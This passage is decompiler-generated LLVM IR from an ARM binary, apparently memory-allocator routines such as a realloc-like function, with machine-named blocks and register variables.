  store i32 %v0_14530, i32* %r4.global-to-local, align 4
  %v2_14534 = icmp eq i32 %v0_14530, 0
  br i1 %v2_14534, label %.thread, label %dec_label_pc_1453c

dec_label_pc_1453c:                               ; preds = %dec_label_pc_144f0
  %v1_1453c = add i32 %v0_14530, -4
  %v2_1453c = inttoptr i32 %v1_1453c to i32*
  %v3_1453c = load i32, i32* %v2_1453c, align 4
  %v1_14540 = and i32 %v3_1453c, 2
  %v2_14540 = icmp eq i32 %v1_14540, 0
  br i1 %v2_14540, label %dec_label_pc_14548, label %.thread

dec_label_pc_14548:                               ; preds = %dec_label_pc_1453c
  %v1_145487 = add i32 %v3_1453c, -4
  %v1_1454c = and i32 %v1_145487, -4
  store i32 %v1_1454c, i32* @r2, align 4
  %v3_14550 = udiv i32 %v1_1454c, 4
  store i32 %v3_14550, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1454c, 36
  %v2_14558 = icmp ult i32 %v1_1454c, 33
  %v3_14558 = or i1 %tmp, %v2_14558
  br i1 %v3_14558, label %dec_label_pc_14564, label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_14548
  %v2_1455c = inttoptr i32 %v0_14530 to i8*
  %v3_1455c = call i32 @function_135d0(i8* %v2_1455c, i32 0)
  br label %.thread

dec_label_pc_14564:                               ; preds = %dec_label_pc_14548
  %tmp8 = icmp eq i32 %v1_1454c, 16
  %v2_14568 = inttoptr i32 %v0_14530 to i32*
  store i32 0, i32* %v2_14568, align 4
  %v1_1456c = load i32, i32* %r4.global-to-local, align 4
  %v2_1456c = add i32 %v1_1456c, 4
  %v3_1456c = inttoptr i32 %v2_1456c to i32*
  store i32 0, i32* %v3_1456c, align 4
  %v1_14570 = load i32, i32* %r4.global-to-local, align 4
  %v2_14570 = add i32 %v1_14570, 8
  %v3_14570 = inttoptr i32 %v2_14570 to i32*
  store i32 0, i32* %v3_14570, align 4
  %v2_14574 = icmp ult i32 %v1_1454c, 13
  %v3_14574 = or i1 %tmp8, %v2_14574
  br i1 %v3_14574, label %.thread, label %dec_label_pc_14578

dec_label_pc_14578:                               ; preds = %dec_label_pc_14564
  %v0_14578 = load i32, i32* %ip.global-to-local, align 4
  %v1_1457c = load i32, i32* %r4.global-to-local, align 4
  %v2_1457c = add i32 %v1_1457c, 12
  %v3_1457c = inttoptr i32 %v2_1457c to i32*
  store i32 0, i32* %v3_1457c, align 4
  %v1_14580 = load i32, i32* %r4.global-to-local, align 4
  %v2_14580 = add i32 %v1_14580, 16
  %v3_14580 = inttoptr i32 %v2_14580 to i32*
  store i32 0, i32* %v3_14580, align 4
  %tmp9 = icmp ult i32 %v0_14578, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %dec_label_pc_14578
  %v0_14588 = load i32, i32* %ip.global-to-local, align 4
  %v7_14588 = icmp eq i32 %v0_14588, 9
  %v1_1458c = load i32, i32* %r4.global-to-local, align 4
  %v2_1458c = add i32 %v1_1458c, 20
  %v3_1458c = inttoptr i32 %v2_1458c to i32*
  store i32 0, i32* %v3_1458c, align 4
  %v1_14590 = load i32, i32* %r4.global-to-local, align 4
  %v2_14590 = add i32 %v1_14590, 24
  %v3_14590 = inttoptr i32 %v2_14590 to i32*
  store i32 0, i32* %v3_14590, align 4
  br i1 %v7_14588, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14588
  %v2_14594 = load i32, i32* %r4.global-to-local, align 4
  %v3_14594 = add i32 %v2_14594, 32
  %v4_14594 = inttoptr i32 %v3_14594 to i32*
  store i32 0, i32* %v4_14594, align 4
  %v2_14598 = load i32, i32* %r4.global-to-local, align 4
  %v3_14598 = add i32 %v2_14598, 28
  %v4_14598 = inttoptr i32 %v3_14598 to i32*
  store i32 0, i32* %v4_14598, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14588, %dec_label_pc_1453c, %dec_label_pc_14578, %dec_label_pc_14564, %dec_label_pc_144f0, %dec_label_pc_1455c, %bb
  %v0_145a8 = load i32, i32* @r5, align 4
  %v2_145a8 = add i32 %v0_145a8, 24
  %v3_145a8 = inttoptr i32 %v2_145a8 to i32*
  %v4_145a8 = load i32, i32* %v3_145a8, align 4
  store i32 %v4_145a8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_145a8)
  br label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %dec_label_pc_144dc, %.thread
  %v0_145b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_144a8, i32* @r4, align 4
  store i32 %v6_144a8, i32* @r5, align 4
  store i32 %v9_144a8, i32* @r6, align 4
  store i32 %v12_144a8, i32* @lr, align 4
  ret i32 %v0_145b4

; uselistorder directives
  uselistorder i32 %v1_1454c, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v0_14530, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 2, 9, 11, 1, 10, 3, 4, 5, 6, 12, 7, 13, 8, 14 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_145b4, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_145c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_145c8:
  %v0_145c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_145c8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_145c8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_145c8, %bb
  %v10_145d8 = phi i32 [ %arg1, %dec_label_pc_145c8 ], [ 0, %bb ]
  ret i32 %v10_145d8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_145dc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_145dc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_145dc = load i32, i32* @r4, align 4
  %v6_145dc = load i32, i32* @r5, align 4
  %v9_145dc = load i32, i32* @r6, align 4
  %v12_145dc = load i32, i32* @r7, align 4
  %v15_145dc = load i32, i32* @r8, align 4
  %v18_145dc = load i32, i32* @sb, align 4
  %v21_145dc = load i32, i32* @sl, align 4
  %v24_145dc = load i32, i32* @fp, align 4
  %v27_145dc = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_145e8 = icmp eq i32* %arg1, null
  store i32 135344, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_145e8, label %dec_label_pc_145fc, label %dec_label_pc_1460c

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145dc
  store i32 %arg2, i32* @r0, align 4
  %v0_14600 = call i32 @function_13b88()
  store i32 %v0_14600, i32* %r0.global-to-local, align 4
  store i32 %v0_14600, i32* @r4, align 4
  br label %dec_label_pc_14964

dec_label_pc_1460c:                               ; preds = %dec_label_pc_145dc
  %v2_1460c = icmp eq i32 %arg2, 0
  br i1 %v2_1460c, label %dec_label_pc_14614, label %dec_label_pc_14620

dec_label_pc_14614:                               ; preds = %dec_label_pc_1460c
  %v0_14614 = call i32 @function_14bf4()
  store i32 %v0_14614, i32* %r0.global-to-local, align 4
  %v0_14618 = load i32, i32* @r6, align 4
  store i32 %v0_14618, i32* @r4, align 4
  br label %dec_label_pc_14964

dec_label_pc_14620:                               ; preds = %dec_label_pc_1460c
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_14628 = load i32, i32* inttoptr (i32 135412 to i32*), align 4
  store i32 %v4_14628, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_14628, i32* %r2.global-to-local, align 4
  %v4_14634 = load i32, i32* inttoptr (i32 135380 to i32*), align 4
  store i32 %v4_14634, i32* %r1.global-to-local, align 4
  %v2_14638 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_14638, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14640 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_14640)
  %v0_1464c = load i32, i32* @r4, align 4
  store i32 %v0_1464c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 135344, i32* %r1.global-to-local, align 4
  %v4_14658 = load i32, i32* inttoptr (i32 135360 to i32*), align 64
  store i32 %v4_14658, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14664.573 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14658)
  %v0_14664 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_14664, -32
  br i1 %tmp36, label %dec_label_pc_14680, label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_14620
  %v0_1466c = call i32 @function_13574()
  store i32 %v0_1466c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14678 = inttoptr i32 %v0_1466c to i32*
  store i32 12, i32* %v2_14678, align 4
  br label %dec_label_pc_14964

dec_label_pc_14680:                               ; preds = %dec_label_pc_14620
  %v1_14680 = add i32 %v0_14664, 11
  store i32 %v1_14680, i32* %r0.global-to-local, align 4
  %v0_14684 = load i32, i32* @r5, align 4
  %v1_14684 = add i32 %v0_14684, -4
  %v2_14684 = inttoptr i32 %v1_14684 to i32*
  %v3_14684 = load i32, i32* %v2_14684, align 4
  store i32 %v3_14684, i32* %r2.global-to-local, align 4
  %v2_14688 = icmp ugt i32 %v1_14680, 14
  %v7_14688 = icmp eq i32 %v1_14680, 15
  %v2_1468c = xor i1 %v2_14688, true
  %v3_1468c = or i1 %v7_14688, %v2_1468c
  br i1 %v3_1468c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_14680
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_14680, %bb
  %v2_14690 = xor i1 %v7_14688, true
  %v3_14690 = and i1 %v2_14688, %v2_14690
  br i1 %v3_14690, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_14690 = and i32 %v1_14680, -8
  store i32 %v5_14690, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_14694 = and i32 %v3_14684, 2
  %v2_14694 = icmp eq i32 %v1_14694, 0
  %v1_14698 = add i32 %v0_14684, -8
  store i32 %v1_14698, i32* @sl, align 4
  %v1_1469c = and i32 %v3_14684, -4
  store i32 %v1_1469c, i32* @r6, align 4
  br i1 %v2_14694, label %dec_label_pc_146a4, label %dec_label_pc_1487c

dec_label_pc_146a4:                               ; preds = %bb29
  %v1_146a4 = load i32, i32* @sb, align 4
  %v3_146a4 = icmp ult i32 %v1_1469c, %v1_146a4
  br i1 %v3_146a4, label %dec_label_pc_146b0, label %bb30

bb30:                                             ; preds = %dec_label_pc_146a4
  store i32 %v1_1469c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14814

dec_label_pc_146b0:                               ; preds = %dec_label_pc_146a4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_146b8 = load i32, i32* inttoptr (i32 135376 to i32*), align 16
  store i32 %v4_146b8, i32* %r0.global-to-local, align 4
  %v1_146bc = add i32 %v4_146b8, 44
  %v2_146bc = inttoptr i32 %v1_146bc to i32*
  %v3_146bc = load i32, i32* %v2_146bc, align 4
  store i32 %v3_146bc, i32* %r3.global-to-local, align 4
  %v2_146c0 = add i32 %v1_1469c, %v1_14698
  store i32 %v2_146c0, i32* @r4, align 4
  %v9_146c4 = icmp eq i32 %v2_146c0, %v3_146bc
  %v1_146c8 = add i32 %v2_146c0, 4
  %v2_146c8 = inttoptr i32 %v1_146c8 to i32*
  %v3_146c8 = load i32, i32* %v2_146c8, align 4
  store i32 %v3_146c8, i32* %r1.global-to-local, align 4
  br i1 %v9_146c4, label %dec_label_pc_146d0, label %dec_label_pc_1470c

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146b0
  %v1_146d0 = and i32 %v3_146c8, -4
  %v2_146d4 = add i32 %v1_146d0, %v1_1469c
  store i32 %v2_146d4, i32* %r1.global-to-local, align 4
  %v1_146d8 = add i32 %v1_146a4, 16
  store i32 %v1_146d8, i32* %r3.global-to-local, align 4
  %v3_146dc = icmp ult i32 %v2_146d4, %v1_146d8
  br i1 %v3_146dc, label %dec_label_pc_14760, label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %dec_label_pc_146d0
  %v2_146e4 = sub i32 %v2_146d4, %v1_146a4
  %v1_146e8 = urem i32 %v3_14684, 2
  %v2_146ec = add i32 %v1_146a4, %v1_14698
  store i32 %v2_146ec, i32* %r1.global-to-local, align 4
  %v2_146f0 = or i32 %v1_146a4, %v1_146e8
  store i32 %v2_146f0, i32* %r2.global-to-local, align 4
  %v1_146f4 = or i32 %v2_146e4, 1
  store i32 %v1_146f4, i32* %r3.global-to-local, align 4
  store i32 %v0_14684, i32* @r4, align 4
  store i32 %v2_146f0, i32* %v2_14684, align 4
  %v0_14700 = load i32, i32* %r1.global-to-local, align 4
  %v1_14700 = load i32, i32* %r0.global-to-local, align 4
  %v2_14700 = add i32 %v1_14700, 44
  %v3_14700 = inttoptr i32 %v2_14700 to i32*
  store i32 %v0_14700, i32* %v3_14700, align 4
  %v0_14704 = load i32, i32* %r3.global-to-local, align 4
  %v1_14704 = load i32, i32* %r1.global-to-local, align 4
  %v2_14704 = add i32 %v1_14704, 4
  %v3_14704 = inttoptr i32 %v2_14704 to i32*
  store i32 %v0_14704, i32* %v3_14704, align 4
  br label %dec_label_pc_14948

dec_label_pc_1470c:                               ; preds = %dec_label_pc_146b0
  %v1_1470c = and i32 %v3_146c8, -2
  %v2_14710 = add i32 %v1_1470c, %v2_146c0
  store i32 %v2_14710, i32* %r3.global-to-local, align 4
  %v1_14714 = add i32 %v2_14710, 4
  %v2_14714 = inttoptr i32 %v1_14714 to i32*
  %v3_14714 = load i32, i32* %v2_14714, align 4
  store i32 %v3_14714, i32* %r3.global-to-local, align 4
  %v1_14718 = urem i32 %v3_14714, 2
  %v2_14718 = icmp eq i32 %v1_14718, 0
  br i1 %v2_14718, label %dec_label_pc_14720, label %dec_label_pc_14760

dec_label_pc_14720:                               ; preds = %dec_label_pc_1470c
  %v1_14720 = and i32 %v3_146c8, -4
  store i32 %v1_14720, i32* %r3.global-to-local, align 4
  %v2_14724 = add i32 %v1_14720, %v1_1469c
  store i32 %v2_14724, i32* %r0.global-to-local, align 4
  %v3_14728 = icmp ult i32 %v2_14724, %v1_146a4
  br i1 %v3_14728, label %dec_label_pc_14760, label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14720
  %v1_14730 = add i32 %v1_1469c, %v0_14684
  %v2_14730 = inttoptr i32 %v1_14730 to i32*
  %v3_14730 = load i32, i32* %v2_14730, align 4
  store i32 %v3_14730, i32* %r1.global-to-local, align 4
  %v1_14734 = add i32 %v3_14730, 12
  %v2_14734 = inttoptr i32 %v1_14734 to i32*
  %v3_14734 = load i32, i32* %v2_14734, align 4
  store i32 %v3_14734, i32* %r3.global-to-local, align 4
  %v9_14738 = icmp eq i32 %v3_14734, %v2_146c0
  %v1_1473c = add i32 %v2_146c0, 12
  %v2_1473c = inttoptr i32 %v1_1473c to i32*
  %v3_1473c = load i32, i32* %v2_1473c, align 4
  store i32 %v3_1473c, i32* %r2.global-to-local, align 4
  br i1 %v9_14738, label %dec_label_pc_14744, label %dec_label_pc_14750

dec_label_pc_14744:                               ; preds = %dec_label_pc_14730
  %v1_14744 = add i32 %v3_1473c, 8
  %v2_14744 = inttoptr i32 %v1_14744 to i32*
  %v3_14744 = load i32, i32* %v2_14744, align 4
  store i32 %v3_14744, i32* %r3.global-to-local, align 4
  %v9_14748 = icmp eq i32 %v3_14744, %v2_146c0
  br i1 %v9_14748, label %dec_label_pc_14754, label %dec_label_pc_14750

dec_label_pc_14750:                               ; preds = %dec_label_pc_14730, %dec_label_pc_14744
  %v0_14750 = call i32 @function_14e70()
  store i32 %v0_14750, i32* %r0.global-to-local, align 4
  %v0_14754.pre = load i32, i32* @r1, align 4
  %v1_14754.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14754

dec_label_pc_14754:                               ; preds = %dec_label_pc_14744, %dec_label_pc_14750
  %v1_14754 = phi i32 [ %v3_1473c, %dec_label_pc_14744 ], [ %v1_14754.pre, %dec_label_pc_14750 ]
  %v0_14754 = phi i32 [ %v3_14730, %dec_label_pc_14744 ], [ %v0_14754.pre, %dec_label_pc_14750 ]
  %v2_14754 = add i32 %v1_14754, 8
  %v3_14754 = inttoptr i32 %v2_14754 to i32*
  store i32 %v0_14754, i32* %v3_14754, align 4
  %v0_14758 = load i32, i32* %r2.global-to-local, align 4
  %v1_14758 = load i32, i32* %r1.global-to-local, align 4
  %v2_14758 = add i32 %v1_14758, 12
  %v3_14758 = inttoptr i32 %v2_14758 to i32*
  store i32 %v0_14758, i32* %v3_14758, align 4
  %v1_14814.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14814

dec_label_pc_14760:                               ; preds = %dec_label_pc_146d0, %dec_label_pc_14720, %dec_label_pc_1470c
  %v1_14760 = add i32 %v1_146a4, -7
  store i32 %v1_14760, i32* @r0, align 4
  %v0_14764 = call i32 @function_13b88()
  store i32 %v0_14764, i32* @r0, align 4
  store i32 %v0_14764, i32* %r1.global-to-local, align 4
  %v2_14768 = icmp eq i32 %v0_14764, 0
  br i1 %v2_14768, label %bb31, label %dec_label_pc_14774

bb31:                                             ; preds = %dec_label_pc_14760
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_14774:                               ; preds = %dec_label_pc_14760
  %v1_1477c.pre = load i32, i32* @r4, align 4
  %v1_14774 = add i32 %v0_14764, -4
  %v2_14774 = inttoptr i32 %v1_14774 to i32*
  %v3_14774 = load i32, i32* %v2_14774, align 4
  store i32 %v3_14774, i32* @r3, align 4
  %v1_14778 = add i32 %v0_14764, -8
  store i32 %v1_14778, i32* @r7, align 4
  %v9_1477c = icmp eq i32 %v1_14778, %v1_1477c.pre
  br i1 %v9_1477c, label %.thread2, label %dec_label_pc_1478c

.thread2:                                         ; preds = %dec_label_pc_14774
  %v2_14780 = and i32 %v3_14774, -4
  store i32 %v2_14780, i32* %r3.global-to-local, align 4
  %v2_14784 = load i32, i32* @r6, align 4
  %v3_14784 = add i32 %v2_14784, %v2_14780
  store i32 %v3_14784, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14814

dec_label_pc_1478c:                               ; preds = %dec_label_pc_14774
  %v0_1478c = load i32, i32* @r6, align 4
  %v1_1478c = add i32 %v0_1478c, -4
  store i32 %v1_1478c, i32* @r2, align 4
  %v3_14790 = udiv i32 %v1_1478c, 4
  store i32 %v3_14790, i32* @ip, align 4
  %tmp37 = and i32 %v1_1478c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_14798 = icmp ult i32 %v1_1478c, 36
  %v3_14798 = or i1 %tmp38, %v2_14798
  %v0_147a8 = load i32, i32* @r5, align 4
  br i1 %v3_14798, label %dec_label_pc_147a8, label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_1478c
  store i32 %v0_147a8, i32* @r1, align 4
  %v0_147a0 = call i32 @function_13680()
  store i32 %v0_147a0, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_147a8:                               ; preds = %dec_label_pc_1478c
  %v1_147a8 = inttoptr i32 %v0_147a8 to i32*
  %v2_147a8 = load i32, i32* %v1_147a8, align 4
  store i32 %v2_147a8, i32* %r3.global-to-local, align 4
  %v2_147ac = inttoptr i32 %v0_14764 to i32*
  store i32 %v2_147a8, i32* %v2_147ac, align 4
  %v0_147b0 = load i32, i32* @r5, align 4
  %v1_147b0 = add i32 %v0_147b0, 4
  %v2_147b0 = inttoptr i32 %v1_147b0 to i32*
  %v3_147b0 = load i32, i32* %v2_147b0, align 4
  store i32 %v3_147b0, i32* %r3.global-to-local, align 4
  %v1_147b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_147b4 = add i32 %v1_147b4, 4
  %v3_147b4 = inttoptr i32 %v2_147b4 to i32*
  store i32 %v3_147b0, i32* %v3_147b4, align 4
  %v0_147b8 = load i32, i32* @r5, align 4
  %v1_147b8 = add i32 %v0_147b8, 8
  %v2_147b8 = inttoptr i32 %v1_147b8 to i32*
  %v3_147b8 = load i32, i32* %v2_147b8, align 4
  store i32 %v3_147b8, i32* %r3.global-to-local, align 4
  %v0_147bc = load i32, i32* @ip, align 4
  %v1_147c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_147c0 = add i32 %v1_147c0, 8
  %v3_147c0 = inttoptr i32 %v2_147c0 to i32*
  store i32 %v3_147b8, i32* %v3_147c0, align 4
  %tmp39 = icmp ult i32 %v0_147bc, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_147c8

dec_label_pc_147c8:                               ; preds = %dec_label_pc_147a8
  %v0_147c8 = load i32, i32* @r5, align 4
  %v1_147c8 = add i32 %v0_147c8, 12
  %v2_147c8 = inttoptr i32 %v1_147c8 to i32*
  %v3_147c8 = load i32, i32* %v2_147c8, align 4
  store i32 %v3_147c8, i32* %r3.global-to-local, align 4
  %v1_147cc = load i32, i32* %r1.global-to-local, align 4
  %v2_147cc = add i32 %v1_147cc, 12
  %v3_147cc = inttoptr i32 %v2_147cc to i32*
  store i32 %v3_147c8, i32* %v3_147cc, align 4
  %v0_147d0 = load i32, i32* @r5, align 4
  %v1_147d0 = add i32 %v0_147d0, 16
  %v2_147d0 = inttoptr i32 %v1_147d0 to i32*
  %v3_147d0 = load i32, i32* %v2_147d0, align 4
  store i32 %v3_147d0, i32* %r3.global-to-local, align 4
  %v0_147d4 = load i32, i32* @ip, align 4
  %v1_147d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_147d8 = add i32 %v1_147d8, 16
  %v3_147d8 = inttoptr i32 %v2_147d8 to i32*
  store i32 %v3_147d0, i32* %v3_147d8, align 4
  %tmp40 = icmp ult i32 %v0_147d4, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_147e0

dec_label_pc_147e0:                               ; preds = %dec_label_pc_147c8
  %v0_147e0 = load i32, i32* @r5, align 4
  %v1_147e0 = add i32 %v0_147e0, 20
  %v2_147e0 = inttoptr i32 %v1_147e0 to i32*
  %v3_147e0 = load i32, i32* %v2_147e0, align 4
  store i32 %v3_147e0, i32* %r3.global-to-local, align 4
  %v1_147e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_147e4 = add i32 %v1_147e4, 20
  %v3_147e4 = inttoptr i32 %v2_147e4 to i32*
  store i32 %v3_147e0, i32* %v3_147e4, align 4
  %v0_147e8 = load i32, i32* @r5, align 4
  %v1_147e8 = add i32 %v0_147e8, 24
  %v2_147e8 = inttoptr i32 %v1_147e8 to i32*
  %v3_147e8 = load i32, i32* %v2_147e8, align 4
  store i32 %v3_147e8, i32* %r3.global-to-local, align 4
  %v1_147ec = load i32, i32* %r1.global-to-local, align 4
  %v2_147ec = add i32 %v1_147ec, 24
  %v3_147ec = inttoptr i32 %v2_147ec to i32*
  store i32 %v3_147e8, i32* %v3_147ec, align 4
  %v0_147f0 = load i32, i32* @ip, align 4
  %v7_147f0 = icmp eq i32 %v0_147f0, 9
  br i1 %v7_147f0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_147e0
  %v1_147f4 = load i32, i32* @r5, align 4
  %v2_147f4 = add i32 %v1_147f4, 28
  %v3_147f4 = inttoptr i32 %v2_147f4 to i32*
  %v4_147f4 = load i32, i32* %v3_147f4, align 4
  store i32 %v4_147f4, i32* %r3.global-to-local, align 4
  %v2_147f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_147f8 = add i32 %v2_147f8, 28
  %v4_147f8 = inttoptr i32 %v3_147f8 to i32*
  store i32 %v4_147f4, i32* %v4_147f8, align 4
  %v1_147fc = load i32, i32* @r5, align 4
  %v2_147fc = add i32 %v1_147fc, 32
  %v3_147fc = inttoptr i32 %v2_147fc to i32*
  %v4_147fc = load i32, i32* %v3_147fc, align 4
  store i32 %v4_147fc, i32* %r3.global-to-local, align 4
  %v2_14800 = load i32, i32* %r1.global-to-local, align 4
  %v3_14800 = add i32 %v2_14800, 32
  %v4_14800 = inttoptr i32 %v3_14800 to i32*
  store i32 %v4_147fc, i32* %v4_14800, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_147e0, %dec_label_pc_147c8, %dec_label_pc_147a8, %dec_label_pc_1479c, %bb32
  %v0_14804 = load i32, i32* @r5, align 4
  store i32 %v0_14804, i32* @r0, align 4
  %v0_14808 = call i32 @function_14bf4()
  store i32 %v0_14808, i32* %r0.global-to-local, align 4
  %v0_1480c = load i32, i32* @r7, align 4
  %v1_1480c = add i32 %v0_1480c, 8
  store i32 %v1_1480c, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_14814:                               ; preds = %bb30, %.thread2, %dec_label_pc_14754
  %v0_14828 = phi i32 [ %v3_14784, %.thread2 ], [ %v1_1469c, %bb30 ], [ %v1_14814.pre, %dec_label_pc_14754 ]
  %v0_14814 = load i32, i32* @sb, align 4
  %v2_14814 = sub i32 %v0_14828, %v0_14814
  store i32 %v2_14814, i32* %r1.global-to-local, align 4
  %v0_1481c = load i32, i32* @sl, align 4
  %v1_1481c = add i32 %v0_1481c, 4
  %v2_1481c = inttoptr i32 %v1_1481c to i32*
  %v3_1481c = load i32, i32* %v2_1481c, align 4
  %tmp41 = icmp ugt i32 %v2_14814, 15
  %v1_14844 = urem i32 %v3_1481c, 2
  store i32 %v1_14844, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_14844, label %dec_label_pc_14824

dec_label_pc_14824:                               ; preds = %dec_label_pc_14814
  %v2_14828 = or i32 %v1_14844, %v0_14828
  store i32 %v2_14828, i32* %r3.global-to-local, align 4
  store i32 %v2_14828, i32* %v2_1481c, align 4
  %v0_14830 = load i32, i32* @sl, align 4
  %v1_14830 = load i32, i32* %r0.global-to-local, align 4
  %v2_14830 = add i32 %v1_14830, %v0_14830
  store i32 %v2_14830, i32* %r2.global-to-local, align 4
  %v1_14834 = add i32 %v2_14830, 4
  %v2_14834 = inttoptr i32 %v1_14834 to i32*
  %v3_14834 = load i32, i32* %v2_14834, align 4
  %v1_14838 = or i32 %v3_14834, 1
  store i32 %v1_14838, i32* %r3.global-to-local, align 4
  store i32 %v1_14838, i32* %v2_14834, align 4
  br label %dec_label_pc_14874

dec_label_pc_14844:                               ; preds = %dec_label_pc_14814
  %v2_14848 = add i32 %v0_1481c, %v0_14814
  store i32 %v2_14848, i32* %r0.global-to-local, align 4
  %v2_1484c = or i32 %v1_14844, %v0_14814
  store i32 %v2_1484c, i32* %r3.global-to-local, align 4
  %v1_14850 = or i32 %v2_14814, 1
  store i32 %v1_14850, i32* %r2.global-to-local, align 4
  store i32 %v2_1484c, i32* %v2_1481c, align 4
  %v0_14858 = load i32, i32* %r2.global-to-local, align 4
  %v1_14858 = load i32, i32* %r0.global-to-local, align 4
  %v2_14858 = add i32 %v1_14858, 4
  %v3_14858 = inttoptr i32 %v2_14858 to i32*
  store i32 %v0_14858, i32* %v3_14858, align 4
  %v0_1485c = load i32, i32* %r0.global-to-local, align 4
  %v1_1485c = load i32, i32* %r1.global-to-local, align 4
  %v2_1485c = add i32 %v1_1485c, %v0_1485c
  store i32 %v2_1485c, i32* %r2.global-to-local, align 4
  %v1_14860 = add i32 %v2_1485c, 4
  %v2_14860 = inttoptr i32 %v1_14860 to i32*
  %v3_14860 = load i32, i32* %v2_14860, align 4
  %v1_14864 = or i32 %v3_14860, 1
  store i32 %v1_14864, i32* %r3.global-to-local, align 4
  store i32 %v1_14864, i32* %v2_14860, align 4
  %v0_1486c = load i32, i32* %r0.global-to-local, align 4
  %v1_1486c = add i32 %v0_1486c, 8
  store i32 %v1_1486c, i32* @r0, align 4
  %v0_14870 = call i32 @function_14bf4()
  store i32 %v0_14870, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_14824, %dec_label_pc_14844
  %v0_14874 = load i32, i32* @sl, align 4
  %v1_14874 = add i32 %v0_14874, 8
  store i32 %v1_14874, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_1487c:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 135344, i32* %r1.global-to-local, align 4
  %v4_14884 = load i32, i32* inttoptr (i32 135376 to i32*), align 16
  store i32 %v4_14884, i32* @r8, align 4
  %v2_14888 = inttoptr i32 %v1_14698 to i32*
  %v3_14888 = load i32, i32* %v2_14888, align 4
  store i32 %v3_14888, i32* @r4, align 4
  %v1_1488c = add i32 %v4_14884, 860
  %v2_1488c = inttoptr i32 %v1_1488c to i32*
  %v3_1488c = load i32, i32* %v2_1488c, align 4
  %v1_14890 = add i32 %v3_14888, 4
  %v1_14894 = add i32 %v3_1488c, -1
  store i32 %v1_14894, i32* %r2.global-to-local, align 4
  %v2_14898 = add i32 %v1_14890, %v1_14894
  %v1_1489c = load i32, i32* @sb, align 4
  %v2_1489c = add i32 %v2_14898, %v1_1489c
  store i32 %v2_1489c, i32* %r3.global-to-local, align 4
